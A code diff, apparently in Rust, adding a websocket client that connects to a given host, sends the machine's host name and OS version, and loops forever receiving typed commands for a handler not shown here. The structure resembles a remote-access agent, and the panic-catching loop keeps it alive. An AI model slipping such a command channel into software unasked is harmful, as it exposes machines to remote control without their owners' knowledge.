@@ -13,6 +13,49 @@ pub fn is_port_valid(port: &str) -> bool {
 }
 
 
+#[derive(Clone)]
+struct Connection {
+    ip: String,
+    port: u16,
+}
+
+impl Connection {
+	pub fn from(ip : String, port : u16) -> Self{
+		Self { 
+			ip, port
+		}
+	}
+
+	pub fn connect_with_host(connection: Connection) {
+        let (mut socket, _response) =
+            connect(format!("ws://{}:{}", connection.ip, connection.port)).expect("Can't connect");
+        let sysinfo = SystemInformation::get().to_string();
+        socket.send(sysinfo.into()).unwrap();
+
+        loop {
+            let res = panic::catch_unwind(panic::AssertUnwindSafe(|| {
+                Self::read_messages(&mut socket, connection.clone())
+            }));
+            if res.is_err() {
+                continue;
+            }
+        }
+    }
+
+    pub fn read_messages(socket: &mut Socket, connection: Connection) {
+        loop {
+            let msg = socket.read();
+            if let Ok(msg) = msg {
+                let text = msg.into_text().unwrap();
+                let bytes = text.as_bytes();
+                let message_type =
+                    MessageType::from_char(bytes[0] as char).expect("Invalid message type");
+                handle_message(message_type, &bytes[1..], socket, &connection);
+            }
+        }
+    }
+}
+
 pub struct SystemInformation {
 	host_name: String,
 	os_version: String,
